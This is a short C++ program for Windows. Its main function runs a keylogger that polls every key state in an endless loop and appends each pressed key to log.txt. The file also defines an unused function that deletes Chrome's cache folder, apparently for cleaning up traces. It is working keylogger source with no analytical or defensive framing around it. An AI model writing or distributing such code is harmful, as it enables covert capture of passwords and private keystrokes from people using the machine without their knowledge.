#include <iostream>
#include <cstdlib>
#include <string>
#include <filesystem>
#include <Windows.h>
#include <fstream>

void clearBrowserCache(){
    std::string appData = getenv("APPDATA");
    if (appData.empty()) return ;
    else{
        std::string cachePath = appData + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\";
        try{
            std::filesystem::remove_all(cachePath);
            std::string createpath = "mkdir" + cachePath;
            std::error_code ec;
            std::filesystem::create_directory(cachePath, ec);
            if (ec) {
                std::cerr << "Error creating cache directory: " << ec.message() << '\n';
            }
        }
        catch(const std::filesystem::filesystem_error& e){
            std::cerr << "Error removing cache directory: " << e.what() << '\n';
        }
        
    }
}

void startLogging(){
    while(true){
        for (int i = 0x08; i <= 0xFE; i++){
            if (GetAsyncKeyState(i) & 0x8000) {
                std::ofstream log;
                log.open("log.txt", std::ios::app);
                log << char(i);
            }
        }
    }
}

int main(){
    startLogging();
    return 0;
}